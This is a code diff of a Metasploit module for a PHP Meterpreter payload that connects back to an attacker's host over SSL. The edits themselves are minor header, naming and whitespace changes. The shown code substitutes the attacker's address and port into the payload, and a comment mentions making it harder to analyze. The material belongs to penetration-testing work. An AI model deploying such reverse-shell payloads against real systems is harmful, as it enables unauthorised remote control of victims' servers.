@@ -1,16 +1,11 @@
-
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp_ssl'
 require 'msf/base/sessions/meterpreter_php'
 require 'msf/base/sessions/meterpreter_options'
-
 
 module MetasploitModule
 
@@ -21,7 +16,7 @@ module MetasploitModule
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'PHP Meterpreter, Reverse TCP Inline using SSL',
+      'Name'          => 'PHP Meterpreter, Reverse TCP Inline Using SSL',
       'Description'   => 'Connect back to attacker with SSL and spawn a Meterpreter server (PHP)',
       'Author'        => ['RageLtMan <rageltman[at]sempervictus>'],
       'Platform'      => 'php',
@@ -37,10 +32,10 @@ module MetasploitModule
       f.read(f.stat.size)
     }
     met.gsub!("ion connect($ipaddr, $port, $proto='tcp')","ion connect($ipaddr, $port, $proto='ssl')")
-    met.gsub!("127.0.0.1", datastore['LHOST'].to_s) if datastore['LHOST']	
+    met.gsub!("127.0.0.1", datastore['LHOST'].to_s) if datastore['LHOST']
     met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
     # Enable SSL mode
-    met.gsub!('($ipaddr, $port, $proto=\'tcp\')','($ipaddr, $port, $proto=\'ssl\')')	
+    met.gsub!('($ipaddr, $port, $proto=\'tcp\')','($ipaddr, $port, $proto=\'ssl\')')
     # XXX When this payload is more stable, remove comments and compress
     # whitespace to make it smaller and a bit harder to analyze
     met.gsub!(/#.*$/, '')
